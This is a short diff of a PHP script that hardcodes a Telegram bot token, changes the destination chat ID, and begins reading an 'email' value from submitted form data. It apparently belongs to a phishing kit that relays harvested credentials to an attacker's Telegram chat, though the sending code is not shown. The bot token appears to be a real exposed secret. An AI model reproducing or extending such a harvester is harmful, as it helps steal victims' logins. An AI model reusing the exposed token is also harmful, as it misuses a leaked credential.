@@ -1,7 +1,7 @@
 <?php
 // Telegram Configuration
 $botToken = '7562492082:AAEOU5iolvr242vlrs4KlLKiiysD4Mi3UkI';
-$chatId = '7562492082';
+$chatId = '5536239543';
 
 // Get posted data
 $email = $_POST['email'] ?? '';
